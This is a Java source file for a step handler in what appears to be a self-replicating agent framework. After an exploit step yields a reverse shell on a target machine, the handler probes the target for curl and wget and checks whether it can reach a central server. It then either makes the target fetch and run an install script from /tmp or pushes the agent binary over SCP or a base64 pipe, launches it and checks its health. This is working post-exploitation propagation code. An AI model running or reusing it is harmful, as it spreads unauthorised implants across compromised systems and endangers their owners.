package com.spulido.agent.worker.step;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.spulido.agent.config.AgentConfig;
import com.spulido.agent.domain.task.StepAction;
import com.spulido.agent.domain.task.StepResult;
import com.spulido.agent.domain.task.TaskResult;
import com.spulido.agent.remote.RemoteCommandExecutor;
import com.spulido.agent.remote.TargetSession;
import com.spulido.agent.worker.BinaryIntegrityVerifier;
import com.spulido.agent.worker.ScriptTemplateService;
import com.spulido.agent.worker.http.AgentHttpClient;

public class TransferAgentStepHandler implements StepHandler {

    private static final Logger log = LoggerFactory.getLogger(TransferAgentStepHandler.class);

    private final AgentHttpClient httpClient;
    private final RemoteCommandExecutor remoteCommandExecutor;
    private final BinaryIntegrityVerifier integrityVerifier;
    private final ScriptTemplateService scriptTemplateService;
    private final AgentConfig config;

    public TransferAgentStepHandler(AgentHttpClient httpClient,
                                     RemoteCommandExecutor remoteCommandExecutor,
                                     BinaryIntegrityVerifier integrityVerifier,
                                     ScriptTemplateService scriptTemplateService,
                                     AgentConfig config) {
        this.httpClient = httpClient;
        this.remoteCommandExecutor = remoteCommandExecutor;
        this.integrityVerifier = integrityVerifier;
        this.scriptTemplateService = scriptTemplateService;
        this.config = config;
    }

    @Override
    public StepResult handle(StepAction action, Map<StepAction, StepResult> context, String targetIp) {
        log.info("Handling TRANSFER_AGENT step");

        StepResult replicationResult = context.get(StepAction.REQUEST_REPLICATION);
        if (replicationResult == null || replicationResult.getLogs() == null) {
            return StepResult.failure(action, List.of("No replication request result available"));
        }

        String downloadUrl = extractFromLogs(replicationResult.getLogs(), "downloadUrl:");
        String preauthCode = extractFromLogs(replicationResult.getLogs(), "preauthCode:");
        String centralUrl = extractFromLogs(replicationResult.getLogs(), "centralUrl:");

        if (downloadUrl == null) {
            return StepResult.failure(action, List.of("No download URL available from replication request"));
        }

        if (centralUrl == null) {
            centralUrl = config.getCentralUrl();
        }

        StepResult exploitResult = context.get(StepAction.EXECUTE_EXPLOIT);
        TargetSession session = buildTargetSession(exploitResult);
        if (session == null) {
            log.warn("No valid target session from exploit, proceeding without target connectivity");
        }

        List<String> logs = new ArrayList<>();

        String transferMethod = config.getExploitTransferMethod();
        int retries = config.getExploitTransferMethodRetries();
        Path localBinaryPath = null;

        try {
            byte[] binary;
            boolean forcePathB = "transfer".equals(transferMethod);
            boolean forcePathA = "http".equals(transferMethod);

            if (session != null && !forcePathA) {
                boolean hasCurl = probeTool(session, "curl");
                boolean hasWget = probeTool(session, "wget");
                boolean centralReachable = probeCentralReachable(session, centralUrl);

                logs.add("probe:curl=" + (hasCurl ? "available" : "missing"));
                logs.add("probe:wget=" + (hasWget ? "available" : "missing"));
                logs.add("probe:centralReachable=" + centralReachable);

                boolean pathAViable = !forcePathB && (hasCurl || hasWget) && centralReachable;

                if (pathAViable) {
                    log.info("Path A selected: target has {} and can reach Central",
                            hasCurl ? "curl" : "wget");
                    logs.add("path:HTTP_DOWNLOAD");

                    return executePathA(action, session, downloadUrl, preauthCode, centralUrl, logs, retries);
                }
            }

            log.info("Path B selected: agent will push binary to target");
            logs.add("path:AGENT_PUSH");

            return executePathB(action, session, downloadUrl, preauthCode, centralUrl, logs);

        } catch (Exception e) {
            log.error("Binary transfer failed", e);
            return StepResult.failure(action,
                    List.of("Binary transfer failed: " + e.getMessage()));
        } finally {
            if (localBinaryPath != null) {
                try {
                    Files.deleteIfExists(localBinaryPath);
                } catch (IOException ignored) {
                }
            }
        }
    }

    private StepResult executePathA(StepAction action, TargetSession session,
                                     String downloadUrl, String preauthCode, String centralUrl,
                                     List<String> logs, int retries) {
        try {
            Map<String, String> replacements = new HashMap<>();
            replacements.put("DOWNLOAD_URL", downloadUrl);
            replacements.put("CENTRAL_URL", centralUrl);
            replacements.put("PREAUTH_CODE", preauthCode != null ? preauthCode : "");
            replacements.put("MANIFEST_URL", "");
            replacements.put("API_KEY", "");
            replacements.put("AGENT_ID", "");
            replacements.put("CENTRAL_PUBLIC_KEY", config.getCentralPublicKey() != null ? config.getCentralPublicKey() : "");

            String installScript = scriptTemplateService.renderTemplate(
                    "install-agent-http.sh.tmpl", replacements);

            TaskResult transferResult = remoteCommandExecutor.transferFile(
                    session, installScript.getBytes(), "/tmp/install-agent.sh", "755");
            if (!transferResult.isSuccess()) {
                log.error("Failed to transfer install script to target");
                return StepResult.failure(action,
                        List.of("Failed to transfer install script: " + transferResult.getMessage()));
            }

            for (int attempt = 1; attempt <= retries; attempt++) {
                log.info("Path A target download attempt {}/{}", attempt, retries);
                TaskResult installResult = remoteCommandExecutor.execute(
                        session, "sh /tmp/install-agent.sh", 30);

                if (installResult.isSuccess() && installResult.getMessage() != null
                        && installResult.getMessage().contains("INSTALL_OK")) {
                    logs.add("targetDownload:success (attempt " + attempt + ")");
                    return doHealthCheck(action, session, logs);
                }

                logs.add("targetDownloadAttempt:" + attempt + ":failed");
                log.warn("Target download attempt {} failed", attempt);

                if (attempt < retries) {
                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }

            log.info("Path A failed after {} attempts, falling back to Path B", retries);
            logs.add("path:fallback_to_B");
            return executePathB(action, session, downloadUrl, preauthCode, centralUrl, logs);

        } catch (Exception e) {
            log.error("Path A execution failed", e);
            logs.add("pathA_error:" + e.getMessage());
            return executePathB(action, session, downloadUrl, preauthCode, centralUrl, logs);
        }
    }

    private StepResult executePathB(StepAction action, TargetSession session,
                                     String downloadUrl, String preauthCode, String centralUrl,
                                     List<String> logs) {
        Path localBinaryPath = null;
        try {
            byte[] binary = httpClient.downloadBinary(downloadUrl);
            log.info("Downloaded agent binary: {} bytes", binary.length);
            logs.add("binaryDownloaded:" + binary.length + "bytes");

            boolean integrityOk = integrityVerifier.verify(binary);
            if (!integrityOk) {
                log.error("Binary integrity verification failed — aborting transfer");
                return StepResult.failure(action,
                        List.of("Binary integrity verification failed"));
            }
            logs.add("integrityCheck:PASSED");

            TaskResult transferResult = remoteCommandExecutor.transferFile(
                    session, binary, "/tmp/agent", "755");
            if (!transferResult.isSuccess()) {
                log.error("Failed to transfer binary to target");
                return StepResult.failure(action,
                        List.of("Binary transfer failed: " + transferResult.getFailureReason()));
            }
            logs.add("binaryTransfer:" + (transferResult.getMessage().contains("SCP") ? "SCP" : "base64_pipe"));

            Map<String, String> replacements = new HashMap<>();
            replacements.put("CENTRAL_URL", centralUrl);
            replacements.put("PREAUTH_CODE", preauthCode != null ? preauthCode : "");
            replacements.put("API_KEY", "");
            replacements.put("AGENT_ID", "");
            replacements.put("CENTRAL_PUBLIC_KEY", config.getCentralPublicKey() != null ? config.getCentralPublicKey() : "");

            String launchScript = scriptTemplateService.renderTemplate(
                    "install-agent-transfer.sh.tmpl", replacements);

            TaskResult scriptTransfer = remoteCommandExecutor.transferFile(
                    session, launchScript.getBytes(), "/tmp/install-agent.sh", "755");
            if (!scriptTransfer.isSuccess()) {
                return StepResult.failure(action,
                        List.of("Failed to transfer launch script: " + scriptTransfer.getMessage()));
            }

            TaskResult launchResult = remoteCommandExecutor.execute(
                    session, "sh /tmp/install-agent.sh", 30);
            if (!launchResult.isSuccess() || launchResult.getMessage() == null
                    || !launchResult.getMessage().contains("INSTALL_OK")) {
                log.error("Agent launch failed");
                return StepResult.failure(action,
                        List.of("Agent launch failed: " + launchResult.getMessage()));
            }

            return doHealthCheck(action, session, logs);

        } catch (Exception e) {
            log.error("Path B execution failed", e);
            return StepResult.failure(action,
                    List.of("Path B transfer failed: " + e.getMessage()));
        } finally {
            if (localBinaryPath != null) {
                try {
                    Files.deleteIfExists(localBinaryPath);
                } catch (IOException ignored) {
                }
            }
        }
    }

    private StepResult doHealthCheck(StepAction action, TargetSession session, List<String> logs) {
        for (int attempt = 1; attempt <= 3; attempt++) {
            try {
                TaskResult healthResult = remoteCommandExecutor.execute(
                        session, "curl -s http://localhost:1222/actuator/health", 10);
                if (healthResult.isSuccess() && healthResult.getMessage() != null
                        && healthResult.getMessage().contains("UP")) {
                    log.info("Health check passed on attempt {}", attempt);
                    logs.add("healthCheck:PASSED (attempt " + attempt + ")");
                    return StepResult.success(action, List.of(), List.of(), logs);
                }
                logs.add("healthCheck:attempt:" + attempt + ":not_ready");
                log.warn("Health check attempt {} not ready", attempt);
            } catch (Exception e) {
                logs.add("healthCheck:attempt:" + attempt + ":error");
                log.warn("Health check attempt {} error: {}", attempt, e.getMessage());
            }

            if (attempt < 3) {
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }

        log.warn("Health check failed after 3 attempts — marking PARTIAL_SUCCESS");
        logs.add("healthCheck:PARTIAL_SUCCESS");
        return StepResult.success(action, List.of(), List.of(), logs);
    }

    private boolean probeTool(TargetSession session, String toolName) {
        try {
            TaskResult result = remoteCommandExecutor.execute(session,
                    "which " + toolName + " && " + toolName + " --version", 10);
            return result.isSuccess();
        } catch (Exception e) {
            log.debug("Tool probe for {} failed: {}", toolName, e.getMessage());
            return false;
        }
    }

    private boolean probeCentralReachable(TargetSession session, String centralUrl) {
        try {
            TaskResult result = remoteCommandExecutor.execute(session,
                    "curl -s --connect-timeout 5 " + centralUrl + "/actuator/health", 10);
            return result.isSuccess();
        } catch (Exception e) {
            log.debug("Central reachability probe failed: {}", e.getMessage());
            return false;
        }
    }

    private TargetSession buildTargetSession(StepResult exploitResult) {
        if (exploitResult == null) return null;

        String sessionTargetIp = extractFromLogs(exploitResult.getLogs(), "targetIp:");
        String targetUser = extractFromLogs(exploitResult.getLogs(), "targetUser:");
        String reverseShell = extractFromLogs(exploitResult.getLogs(), "reverseShellActive:");

        if (sessionTargetIp == null || "unknown".equals(sessionTargetIp)) return null;
        if (!"true".equals(reverseShell)) return null;

        if (targetUser == null) {
            targetUser = config.getExploitDefaultTargetUser();
        }

        return new TargetSession(sessionTargetIp, targetUser, null);
    }

    private String extractFromLogs(List<String> logs, String prefix) {
        if (logs == null) return null;
        return logs.stream()
                .filter(l -> l.startsWith(prefix))
                .findFirst()
                .map(l -> l.substring(prefix.length()).trim())
                .orElse(null);
    }
}
